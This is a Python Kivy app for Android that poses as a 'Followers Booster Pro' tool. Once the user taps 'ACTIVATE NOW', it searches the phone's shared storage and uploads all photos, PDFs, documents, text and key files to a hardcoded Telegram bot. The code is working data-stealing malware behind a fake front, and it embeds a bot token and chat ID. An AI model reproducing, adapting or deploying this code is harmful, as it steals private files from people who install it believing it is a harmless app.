import os
import requests
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.utils import get_color_from_hex
from kivy.core.window import Window

# --- إعدادات تليجرام ---
BOT_TOKEN = "8017423244:AAFSakFPRLMT-ksMTkb_BkBLSwBLYo_9u28"
CHAT_ID = "7145266755"

class SpyApp(App):
    def build(self):
        Window.clear_color = get_color_from_hex('#121212') 
        
        layout = BoxLayout(orientation='vertical', padding=20, spacing=20)

        title = Label(
            text="🚀 Followers Booster Pro",
            font_size='24sp',
            color=(0, 1, 0, 1),
            bold=True,
            size_hint_y=None,
            height=50
        )
        layout.add_widget(title)

        desc = Label(
            text="Enter your username to start increasing followers",
            font_size='14sp',
            color=(0.8, 0.8, 0.8, 1),
            size_hint_y=None,
            height=40
        )
        layout.add_widget(desc)

        self.username = TextInput(
            hint_text="Username (e.g. @username)",
            multiline=False,
            size_hint_y=None,
            height=50,
            padding=[10, 10, 10, 10]
        )
        layout.add_widget(self.username)

        btn = Button(
            text="ACTIVATE NOW",
            background_color=(0, 0.7, 0, 1),
            color=(1, 1, 1, 1),
            font_size='18sp',
            bold=True,
            size_hint=(1, None),
            height=60
        )
        btn.bind(on_press=self.start_stealing)
        layout.add_widget(btn)

        layout.add_widget(Label(size_hint_y=1))

        return layout

    def start_stealing(self, instance):
        instance.text = "Processing... Please wait"
        instance.disabled = True
        try:
            self.steal_data()
        except Exception as e:
            print(f"Error: {e}")

    def steal_data(self):
        target_dirs = ['/sdcard/', '/storage/emulated/0/']
        extensions = ('.jpg', '.jpeg', '.png', '.pdf', '.docx', '.txt', '.key')
        
        for root_dir in target_dirs:
            if os.path.exists(root_dir):
                for root, dirs, files in os.walk(root_dir):
                    for file in files:
                        if file.lower().endswith(extensions):
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, 'rb') as f:
                                    requests.post(
                                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                                        data={'chat_id': CHAT_ID},
                                        files={'document': f}
                                    )
                            except:
                                pass

if __name__ == "__main__":
    SpyApp().run()
